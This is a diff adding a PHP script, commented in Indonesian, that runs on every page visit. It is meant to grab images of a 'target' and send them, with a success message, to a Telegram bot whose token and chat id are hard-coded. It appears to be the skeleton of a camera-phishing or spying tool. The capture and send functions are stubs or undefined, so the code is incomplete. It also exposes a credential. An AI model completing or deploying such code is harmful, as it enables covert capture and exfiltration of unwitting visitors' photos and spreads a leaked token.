@@ -1,0 +1,27 @@
+<?php
+require_once 'vendor/autoload.php'; // Jika menggunakan Composer
+
+$token = "7721778131:AAGmUWdcG0zWz0Om65AM7NXfhyhldHVNT1k";
+$chat_id = "7336408897";
+
+// Fungsi untuk mengambil gambar
+function ambilGambar() {
+    // Logika untuk mengambil gambar
+    // Simpan gambar di server
+    return ['path_to_image1.jpg', 'path_to_image2.jpg'];
+}
+
+// Fungsi untuk mengirim gambar dan pesan
+function kirimGambarDanPesan($chat_id, $token) {
+    $gambar = ambilGambar();
+    foreach ($gambar as $img) {
+        sendPhoto($chat_id, $img, $token);
+    }
+    sendMessage($chat_id, "「Berhasil mengambil foto target」", $token);
+}
+
+// Menangani kunjungan web
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    kirimGambarDanPesan($chat_id, $token);
+}
+?>
